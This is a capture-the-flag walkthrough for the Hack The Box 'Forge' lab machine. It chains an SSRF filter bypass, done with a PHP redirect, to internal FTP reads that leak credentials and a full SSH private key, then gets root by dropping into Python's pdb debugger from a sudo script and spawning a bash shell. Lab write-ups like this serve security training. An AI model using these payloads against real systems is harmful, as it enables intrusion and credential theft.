## Forge HTB Machine(10.10.11.111)

![Screenshot from 2022-01-20 22-52-09](https://user-images.githubusercontent.com/79413473/150390188-667a6b6d-81e8-4837-a2b7-d066a4ca0889.png)

## Recon:
+ Let's add Machine IP into our **/etc/hosts** file `10.10.11.111 forge.htb`.
+ Strating with rustscan port scan we can find only 2 open ports, i.e. 22,80
+ Let's scan these ports with nmap, `nmap -A -p22,80 -T4 10.10.11.111`.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```  
+ Let's also do directory fuzzing in background and we found *upload and uploads*.


+ Upload is that feature and uploads will probably be that directory where all file goes. There is no directory listing enabled.

+ Let's also fuzz for **vhosts** on server.

 `ffuf -u http://forge.htb/ -w /<path>/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.forge.htb" -fc 302` 
  and we found **admin** instantly. Let's add that to hosts file. `10.10.11.111 forge.htb admin.Forge.htb`.
  
## Foothold: Exploiting SSRF to read internal files using ftp

+ Visting website we get simple web page and a upload feature.

![Screenshot from 2022-01-20 23-02-53](https://user-images.githubusercontent.com/79413473/150391464-9f471a37-4159-45ff-8511-650c8ca3b4ad.png)

+ Let's chekc upload page 
 ![Screenshot from 2022-01-20 23-16-27](https://user-images.githubusercontent.com/79413473/150393411-e82a44d6-3078-4395-b744-3105303d0b34.png)

+ We can upload from local machine and we can use a url also. Let's upload one image from my machine. 

![Screenshot from 2022-01-20 23-17-32](https://user-images.githubusercontent.com/79413473/150393659-2d1e3971-762f-474a-81c5-d52a042bcff2.png)

 It gives path to where our file is uploaded.


+ We can try to upload variuos different types of files, and it successfully allows it but in response give random file name in url(no extension) so executing something like a php file or html file semms impossible it also consider everything as image and give **error with this file**.

+ let's check upload from url feature, Fetching something from url umm that smells something like SSRF.
+ POST request data `url=http://<our_url.com>/&remote=1`. Put your ip in url and it will make request to your server.

![Screenshot from 2022-01-20 23-29-26](https://user-images.githubusercontent.com/79413473/150395369-7055eaac-e130-432c-b0b7-00125e9f2d59.png)
+ Notice the User-Agent this means it's a python webserver using python2.
+ Now also visit **admin.forge.htb** and it says *only localhost allowed*. Which means requests originating from server itself.
+ Now at this point we can use SSRF to visit **admin.forge.htb** there are few ways we can do it.
 
  1. It uses regex to check if `URL=` paramter contains strings like *localhost, 127.0.0.1, or admin.forge.htb*. Basically preventing us from accessing internal endpoints but very bad filtering. YOu can read all about SSRF bypassing here
  2. You can make requests with **Admin.Forge.htb** or any character play it will bypass the filter.
  3. What i did is that created my server's **index.php** with 302 redirect to localhost or admin.forge.htb. Which bypasses the blacklist and server don't check where  request actually resolves.
  ```
  <?php
   header("Location: http://admin.forge.htb");
   exit;
  ?>
  ```   
  
  ![Screenshot from 2022-01-20 23-43-38](https://user-images.githubusercontent.com/79413473/150397285-ada0bfa8-fc7f-4258-b580-5cf9852b1f9f.png)
  
  4. Now if you visit this uploaded file it will say error because it's parsing it as image. so you can curl it and it will reveal what's actually in those file.
  5. `curl http://forge.htb/uploads/oaY2aBv4kKghWJXWifEY`.
 
```
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
``` 


6. we can see there is and endpoint for **announcements**. Let's modify our php file accoudingly to read that content. 
 `header("Location: http://admin.forge.htb/announcements")`
7. send the request and curl the image.
```
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```  


+ There are some credentials for a user which can be used to **upload** image through url **?u=** using various protocols on *admin.forge.htb*. 
+ At this point i got lilltle lost, but after some help it turned out we can pass creds using ftp in a URL itself. something like this 
  `ftp://user:password@url`.
+ Let's forge our request to access files through ftp, again you could have done it directly by bypassing blacklisted chracters, i did my way by redirecting server using Location Header `header("Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1");`.
+ send the request and curl the image. You will see contents of directory.
 ```
 drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Jan 20 05:12 user.txt
```  
+ Nice looks like we are in user's home directory. We can read flag or we can first read user's ssh keys and then login.
+ You yould have tried ssh with id and password but it's not allowed. **user@10.10.11.111: Permission denied (publickey).**
+ Let's read user's keys, `header("Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa");`.
+ curling the uploaded the image.
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3
rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE
7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6uk
r6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3D
WJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8G
mL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS/ZLATTsaH46IE/vv9XOJ05qEXR
GUz+aplzDG4wWviSNuerDy9PTGxB6kR5pGbCaEWoRPLVIb9EqnWh279mXu0b4zYhEg+nyD
K6ui/nrmRYUOadgCKXR7zlEm3mgj4hu4cFasH/KlAAAFgK9tvD2vbbw9AAAAB3NzaC1yc2
EAAAGBAJ2SDvkMsH4J37aqOWrPqKx1v8NVm6xuouge079j3UNPTYsTprR0d658R6Lr+P5d
aTtp4z3+Rm41RwLDMCQ15gzY2qmXzvTmAuyu4a+xVesZVFk4cHCqNISDlbhOyYdXfo36Q2
GF6jjea+g8zgyOVjMCypfZ+a27RZKN8Wi3sJB2ExNmGN7r1aacbJwryf+rpK+qe283EcoG
K08hAFoOYDkX7KoQtx2qDsV4l4Bs01sl7X9qOM5jYbLX3YFlgaRH24BYGdw1ifrts/1Tm6
dCCChH7IF/nFl0FLfESQJyoE1IxgJnzUS/ZycaJmB5ckkM9sS+FGF1816/Bpi+l9Ppyq0Y
JWjRXQtMpC0xrIhrNfm3OoyYg9REonmwEv2SwE07Gh+OiBP77/VzidOahF0RlM/mqZcwxu
MFr4kjbnqw8vT0xsQepEeaRmwmhFqETy1SG/RKp1odu/Zl7tG+M2IRIPp8gyurov565kWF
DmnYAil0e85RJt5oI+IbuHBWrB/ypQAAAAMBAAEAAAGALBhHoGJwsZTJyjBwyPc72KdK9r
rqSaLca+DUmOa1cLSsmpLxP+an52hYE7u9flFdtYa4VQznYMgAC0HcIwYCTu4Qow0cmWQU
xW9bMPOLe7Mm66DjtmOrNrosF9vUgc92Vv0GBjCXjzqPL/p0HwdmD/hkAYK6YGfb3Ftkh0
2AV6zzQaZ8p0WQEIQN0NZgPPAnshEfYcwjakm3rPkrRAhp3RBY5m6vD9obMB/DJelObF98
yv9Kzlb5bDcEgcWKNhL1ZdHWJjJPApluz6oIn+uIEcLvv18hI3dhIkPeHpjTXMVl9878F+
kHdcjpjKSnsSjhlAIVxFu3N67N8S3BFnioaWpIIbZxwhYv9OV7uARa3eU6miKmSmdUm1z/
wDaQv1swk9HwZlXGvDRWcMTFGTGRnyetZbgA9vVKhnUtGqq0skZxoP1ju1ANVaaVzirMeu
DXfkpfN2GkoA/ulod3LyPZx3QcT8QafdbwAJ0MHNFfKVbqDvtn8Ug4/yfLCueQdlCBAAAA
wFoM1lMgd3jFFi0qgCRI14rDTpa7wzn5QG0HlWeZuqjFMqtLQcDlhmE1vDA7aQE6fyLYbM
0sSeyvkPIKbckcL5YQav63Y0BwRv9npaTs9ISxvrII5n26hPF8DPamPbnAENuBmWd5iqUf
FDb5B7L+sJai/JzYg0KbggvUd45JsVeaQrBx32Vkw8wKDD663agTMxSqRM/wT3qLk1zmvg
NqD51AfvS/NomELAzbbrVTowVBzIAX2ZvkdhaNwHlCbsqerAAAAMEAzRnXpuHQBQI3vFkC
9vCV+ZfL9yfI2gz9oWrk9NWOP46zuzRCmce4Lb8ia2tLQNbnG9cBTE7TARGBY0QOgIWy0P
fikLIICAMoQseNHAhCPWXVsLL5yUydSSVZTrUnM7Uc9rLh7XDomdU7j/2lNEcCVSI/q1vZ
dEg5oFrreGIZysTBykyizOmFGElJv5wBEV5JDYI0nfO+8xoHbwaQ2if9GLXLBFe2f0BmXr
W/y1sxXy8nrltMVzVfCP02sbkBV9JZAAAAwQDErJZn6A+nTI+5g2LkofWK1BA0X79ccXeL
wS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAb
RVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQb
nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
```  

+ Now we can ssh using this key, `ssh -i id_rsa user@10.10.11.11`. Dont' forget to change keys permission first else you will get error. `chmod 600 id_rsa`.

![Screenshot from 2022-01-21 00-18-10](https://user-images.githubusercontent.com/79413473/150402713-cc0d73c4-626c-4aea-b7dd-ae91978bf185.png)

and we are in.

## Privilege Escaltion: Abusing python's pdb  module intercat feature

+ Running **sudo -l** we can run `/opt/remote-manage.py` file as sudo. Initially i thought about hijacking python libraries  path but sudo paths are protected.
```
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
``` 
+ We can see that it starts a python server and gives client differnt options after authenticating with password **secretadminpassword**. Important thing to note here was the way exception handling done here.
+  I found about this *pdb* library is interesting by doing random fuzzings, we can see that it takes numerical input what will happen if we give it an alphabet and voilla something happened, somekind of intercative shell poped on server's side.![Screenshot from 2022-01-21 00-39-18](https://user-images.githubusercontent.com/79413473/150405875-3f34f8fa-d637-4386-8a12-1d7b3467b1b2.png)

+ I pressed letter *f* and it prompted this pdb shell, now reading about  ![pdb](https://docs.python.org/3/library/pdb.html) what is it and how we can use this to get root.
+ it's `interact` command hooked as it starts python interpreter which same as like running python in your terminal. Btw pdb is library in python which is used for debugging purposes.
+ Let's cause the exception and in shell run `interact` and it will give you a python interpreter. Which is very good as we can run python commands from here with sudo privileges as it was called with sudo privilege.

![Screenshot from 2022-01-21 00-45-53](https://user-images.githubusercontent.com/79413473/150406815-2139d89d-c567-4543-94ec-7b38d81c9f2a.png)

+ Let's spawn a shell now, `import pty; pty.spawn("/bin/bash");`.
![Screenshot from 2022-01-21 00-47-05](https://user-images.githubusercontent.com/79413473/150407040-0b782a3c-6c24-46e9-8d6f-95deed910ad3.png)


And finnaly we have rooted this thing. Woo!





                  
